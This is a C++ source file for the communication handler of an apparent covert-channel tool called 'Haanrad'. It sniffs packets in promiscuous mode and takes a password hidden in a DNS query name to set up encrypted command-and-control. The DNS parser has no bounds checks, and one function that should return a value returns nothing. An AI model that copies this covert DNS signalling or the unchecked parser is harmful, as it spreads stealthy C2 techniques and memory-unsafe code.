//
// Created by bensoer on 31/10/16.
//

#include <pcap.h>
#include <iostream>
#include <cstring>
#include <netinet/udp.h>
#include <dnet.h>
#include "CommHandler.h"
#include "MessageQueue.h"
#include "../shared/Logger.h"
#include "../shared/PacketIdentifier.h"
#include "../shared/Structures.h"
#include "../shared/Authenticator.h"

CommHandler * CommHandler::instance = nullptr;

CommHandler::CommHandler(MessageQueue * messageQueue, HCrypto * crypto) {
    this->messageQueue = messageQueue;
    this->crypto = crypto;

    if(!getInterface()){
        Logger::debug(to_string(getpid()) + " CommHandler - There Was An Error Fetching The Interface For The Monitor");
    }
}

CommHandler* CommHandler::getInstance(MessageQueue * messageQueue, HCrypto * crypto) {
    if(CommHandler::instance == nullptr){
        CommHandler::instance = new CommHandler(messageQueue, crypto);
    }

    return CommHandler::instance;
}

/**
 * killListening is a helepr method so that the client can tell the NetworkMontior and libpcap to stop listening for
 * packets
 */
void CommHandler::killListening() {
    if(this->currentFD != nullptr){
        pcap_breakloop(this->currentFD);
    }
}

bool CommHandler::getInterface() {

    Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::error(to_string(getpid()) + " CommHandler:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("any").c_str()) == 0){
            //this is the any interface
            Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}

bool CommHandler::isValidAuth(PacketMeta meta) {

    //parse out the ip destination address
    struct iphdr * ip2 = (struct iphdr *)meta.packet;

    in_addr_t da = (in_addr_t)ip2->daddr;
    char destinationIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &da, destinationIP, INET_ADDRSTRLEN);
    string strDestinationIP(destinationIP);

    //now check the destination address belongs to an address we know is assigned to one of our interfaces
    bool destinationMatch = false;
    for(pcap_if_t * interface = CommHandler::instance->allInterfaces; interface != NULL; interface=interface->next){

        for(pcap_addr_t * address = interface->addresses; address != NULL; address=address->next){
            if(address->addr->sa_family == AF_INET){

                //if the packets destination address matches ones of these addresses, then we know it was sent to us
                string interfaceIP(inet_ntoa(((struct sockaddr_in*)address->addr)->sin_addr));

                if(interfaceIP.compare(strDestinationIP)==0){
                    destinationMatch = true;
                    break;
                }

            }
        }

        if(destinationMatch){
            break;
        }
    }

    //if there never is a match, we know its not for us - it might even be outbound
    if(destinationMatch == false){
        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Packet Is Not Destined For A Known Address. Can't Be From Haanrad");
        return false;
    }

    //application type here is DNS. Need to confirm its a request destined for us
    char * transportLayer = PacketIdentifier::findTransportLayer(&meta);
    if(transportLayer == nullptr){
        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Could Not Find TransportLayer. Can't Use Packet To check For Password");
        return false;
    }

    //transportLayer could be found
    struct udphdr * udp = (struct udphdr *)transportLayer;
    short destPort = ntohs(udp->dest);
    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Parsed Destination Port: " + to_string(destPort));

    //confirm its for us and DNS using one of the typical DNS destination ports - Google likes to use 5353
    if(destPort == 53 || destPort == 5353){
        return true;
    }

    return false;
}


void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {

    char * BUFFER = (char *)(packet + 16);
    struct iphdr * ip = (struct iphdr *)BUFFER;
    int ipHeaderLength = (ip->ihl * 4);
    int protocol = (ip->protocol);

    //just to make sure we are in the right spot
    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - IP Header Length: " + to_string(ipHeaderLength));
    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Protocol: " + to_string(protocol));

    PacketMeta meta = PacketIdentifier::generatePacketMeta(BUFFER);

    if(CommHandler::instance->haanradConnected == false){
        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Haanrad Hasn't Contacted. Filtering For Passwords Only");
        //haanrad hasn't contacted us yet. We should lookout for its packets so we know how to authenticate

        if(meta.applicationType != ApplicationType::DNS){
            return;
        }

        //check this is a valid auth call from Haanrad
        if(CommHandler::instance->isValidAuth(meta)){
            Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Packet Is A DNS Request For Us. Assumed Haaanrad");

            string password = CommHandler::instance->parseOutDNSQuery(meta);
            Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Received Password From Haanrad: >" + password + "<");

            //initialize all components for communicating with Haanrad
            CommHandler::instance->password = password;
            CommHandler::instance->haanradConnected = true;

            Authenticator::setPassword(password);
            CommHandler::instance->crypto->initialize(password);

            CommHandler::instance->killListening();
        }

    }

}

string CommHandler::parseOutDNSQuery(PacketMeta meta){

    if(meta.applicationType != ApplicationType::DNS){
        Logger::debug("Main:parseOutDNSQuery - FATAL ERROR. PacketMeta Is Not A DNS Packet");
        return "";
    }

    char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
    struct DNS_HEADER * dns = (struct DNS_HEADER * )applicationLayer;

    char * query = applicationLayer + sizeof(struct DNS_HEADER);
    char * ptr = query;

    bool keepProcessing = true;
    string queryName = "";
    bool isFirst = true;
    while(keepProcessing){

        int len = (int)(*ptr);
        //if this is the first one or the last one. don't put a dot
        if(isFirst || len == 0){
            isFirst = false;
        }else{
            queryName += ".";
        }

        if(len == 0){
            break;
        }else{

            ptr++;
            string segment = "";
            for(int i = 0; i < len; ++i){
                char c = (*ptr);
                segment += c;
                ptr++;
            }

            queryName += segment;
        }

    }
    return queryName;
}

void CommHandler::listenForMessages() {

    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 subnetMask;
    bpf_u_int32 ip;

    //fetch network information for interface
    pcap_lookupnet(listeningInterface->name, &subnetMask, &ip, errbuf);

    //open up a raw socket and listen in promisc mode on it for data
    if((this->currentFD = pcap_open_live(listeningInterface->name, BUFSIZ, 1, -1, errbuf)) == NULL){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error in pcap_open_live");
        Logger::debug(string(errbuf));
        return;
    }

    //setup the libpcap filter
    struct bpf_program fp;
    //compile the filter
    if(pcap_compile(this->currentFD, &fp, "udp or tcp", 0, ip) == -1){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error Compiling The Filter");
        return;
    }
    //set the filter
    if(pcap_setfilter(this->currentFD, &fp) == -1){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error Setting The Filter");
        return;
    }

    u_char* args = NULL;
    //listen for packets
    pcap_loop(this->currentFD, 0, CommHandler::packetCallback, args);

}

long CommHandler::processMessagesToSend() {



}